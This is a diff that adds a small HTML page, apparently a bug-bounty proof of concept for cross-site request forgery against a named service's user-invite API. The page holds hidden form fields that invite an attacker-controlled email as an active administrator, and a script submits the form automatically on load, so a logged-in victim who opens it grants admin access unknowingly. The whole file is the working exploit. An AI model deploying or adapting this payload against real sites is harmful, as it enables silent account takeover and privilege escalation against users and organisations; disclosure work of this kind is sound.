@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <form action="https://sandbox-se.upsales.com/api/v2/userInvites" method="POST">
+	  <input type="hidden" name="userInvite[0][email]" value="kgadyrka+attacker@wearehackerone.com" />
+	  <input type="hidden" name="userInvite[0][administrator]" value="1" />
+	  <input type="hidden" name="userInvite[0][language]" value="sv-SE" />
+	  <input type="hidden" name="userInvite[0][active]" value="1" />
+	  <input type="hidden" name="userInvite[0][name]" value="CSRF attacker" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
